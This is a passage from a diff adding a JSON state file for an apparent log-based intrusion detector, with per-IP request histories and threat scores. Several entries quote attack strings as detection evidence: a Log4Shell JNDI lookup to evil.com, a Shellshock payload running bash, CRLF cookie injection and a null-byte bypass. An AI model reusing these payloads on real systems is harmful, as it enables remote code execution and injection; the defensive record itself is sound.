+          "count": 9,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 9,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 9,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "66.249.66.1": {
+      "ip": "66.249.66.1",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "404": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "curl/7.88"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "66.249.66.2": {
+      "ip": "66.249.66.2",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "66.249.66.3": {
+      "ip": "66.249.66.3",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "404": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "66.249.66.4": {
+      "ip": "66.249.66.4",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "66.249.66.5": {
+      "ip": "66.249.66.5",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "66.249.66.6": {
+      "ip": "66.249.66.6",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "404": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.70": {
+      "ip": "203.0.113.70",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 15,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.10": {
+      "ip": "203.0.113.10",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "expression_language_injection",
+        "log4shell_cve_2021_44228"
+      ],
+      "attack_categories_seen": [
+        "expression_language_injection",
+        "cve_exploit"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "expression_language_injection",
+          "rule_name": "expression_language_injection",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 203.0.113.10 - - [21/May/2026:10:10:11 +0000] \"GET /?",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cve_exploit",
+          "rule_name": "log4shell_cve_2021_44228",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 203.0.113.10 - - [21/May/2026:10:10:11 +0000] \"GET /?",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "expression_language_injection",
+          "rule_name": "expression_language_injection",
+          "evidence": "/?x=${jndi:ldap://evil.com/a}",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cve_exploit",
+          "rule_name": "log4shell_cve_2021_44228",
+          "evidence": "/?x=${jndi:ldap://evil.com/a}",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "expression_language_injection",
+          "rule_name": "expression_language_injection",
+          "evidence": "/?x=${jndi:ldap://evil.com/a}",
+          "batch_number": 12
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cve_exploit",
+          "rule_name": "log4shell_cve_2021_44228",
+          "evidence": "/?x=${jndi:ldap://evil.com/a}",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.11": {
+      "ip": "203.0.113.11",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "500": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.12": {
+      "ip": "203.0.113.12",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "php_specific_attack"
+      ],
+      "attack_categories_seen": [
+        "cve_exploit"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cve_exploit",
+          "rule_name": "php_specific_attack",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 203.0.113.12 - - [21/May/2026:10:10:11 +0000] \"GET /c",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cve_exploit",
+          "rule_name": "php_specific_attack",
+          "evidence": "/cgi-bin/test.cgi?x=() { :;}; /bin/bash -c id",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "cve_exploit",
+          "rule_name": "php_specific_attack",
+          "evidence": "/cgi-bin/test.cgi?x=() { :;}; /bin/bash -c id",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "curl/7.88"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.6000000000000001,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.13": {
+      "ip": "203.0.113.13",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.14": {
+      "ip": "203.0.113.14",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.90": {
+      "ip": "203.0.113.90",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 30,
+      "requests_by_status": {
+        "200": 25
+      },
+      "unique_uris_accessed": 25,
+      "auth_failures_total": 0,
+      "auth_successes_total": 25,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 5,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 5,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 5,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 5,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 5,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 5,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "45.12.33.10": {
+      "ip": "45.12.33.10",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "302": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "45.12.33.11": {
+      "ip": "45.12.33.11",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "45.12.33.12": {
+      "ip": "45.12.33.12",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.91": {
+      "ip": "203.0.113.91",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 15,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.44.12.10": {
+      "ip": "91.44.12.10",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "double_url_encoding"
+      ],
+      "attack_categories_seen": [
+        "evasion"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "double_url_encoding",
+          "evidence": "Double URL encoding evasion detected in original_message",
+          "batch_number": 8
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "double_url_encoding",
+          "evidence": "Double URL encoding evasion detected in original_message",
+          "batch_number": 9
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "double_url_encoding",
+          "evidence": "Double URL encoding evasion detected in original_message",
+          "batch_number": 10
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "double_url_encoding",
+          "evidence": "Double raw_url encoding evasion detected in raw_url",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "double_url_encoding",
+          "evidence": "Double raw_url encoding evasion detected in raw_url",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.44.12.11": {
+      "ip": "91.44.12.11",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "null_byte_injection"
+      ],
+      "attack_categories_seen": [
+        "insecure_input_validation"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "insecure_input_validation",
+          "rule_name": "null_byte_injection",
+          "evidence": "/index.php%00.jpg",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "insecure_input_validation",
+          "rule_name": "null_byte_injection",
+          "evidence": "/index.php%00.jpg",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.44.12.12": {
+      "ip": "91.44.12.12",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "crlf_injection"
+      ],
+      "attack_categories_seen": [
+        "insecure_input_validation"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "insecure_input_validation",
+          "rule_name": "crlf_injection",
+          "evidence": "/test%0d%0aSet-Cookie:evil=1",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "insecure_input_validation",
+          "rule_name": "crlf_injection",
+          "evidence": "/test%0d%0aSet-Cookie:evil=1",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
